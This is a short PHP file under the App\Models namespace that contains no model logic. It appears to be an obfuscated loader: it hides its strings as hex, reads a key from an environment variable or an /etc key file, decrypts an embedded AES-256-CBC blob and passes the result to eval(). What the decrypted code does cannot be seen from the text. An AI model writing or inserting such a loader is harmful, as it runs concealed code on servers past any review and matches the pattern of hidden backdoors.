<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('cEDn5+qPc3taI3u2t+1tuw==');

$c=base64_decode(

'CwoWGAI5ERMalYsRcWlC3l0bmenokiL11AHL0a5rtB/JEbotap5g0pN/+taciYNxLUErzI10J3Mb' .
'lFIPwkvU3hxxMIPTqoXbJk/O8/2OjItGZusW4WBwBPcDnP0WgXrlb4hGW8A6vFHnJtWPfVzcEIEV' .
'HLgkJ/nS7xsPSWOJ9TC7/u/2vaDiKZ/eV56PYsLR1xycyjwYyQWbiOj7ZQh33nCMl2F7IPonQEPY' .
'QORTLOtQR1rQQk/WkD6byAJIUtx0AMpyd18zbm5cM+icFI1L5KQ41OKh/vlbDAH5+BsNt7yH2Naa' .
'pzzWfz13ICq6Xrjuru0iOg7BEaZO447On87RI9xsTgc4WLc5/MMMSLAIXiB+jhtEqMR8KvHxVKUK' .
'FUKrSCXOO2N6i12Ivi4mWGn3sAsWgabZyQy18/FX2+lB8VQtfEff1UCu+Jr302UOIoc/UvFY6Z9U' .
'ap3H4i80Hm0umLOInublvKGzfH4F4zynjHb4BxFEOD14pnf5mnpb89XI2fDX8PCOqtXue66ACTv3' .
'4ZFDnc0dKNA94/lxAqHWOEy3Dv2+a24L88vvfpic7YXwMCxJdJr3vtCA03MqhQEBGCnx+hmNDXrp' .
'2bD0SRpCnSRxuc02r4bXPKtHn49cIIpICt+YfVa+rTyc+ySRJ3V61mwNrb4TfKucAdXnhdBojHHF' .
'LviL4YFygzJ9rlayYcl758PGU47LzommPTICZUHPB96OCfZSa2Uut6zjD9ArZZSEghhr2MlYObQS' .
'ATUmZNMOiRgaRHZhQUpw/Ig+YM6fW3W7Xx9TQkuj/TPlKu7uqjN7vwbgmOrL3KkJst6eHALc6Cq/' .
'Xy42oRzcZKFi46f77yN3oXsfOe/DjhO7DhQKEiuRcAQNDKuwynBTYjffg7tSqm4PJW4EADzRZ2/k' .
'3YbnCw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

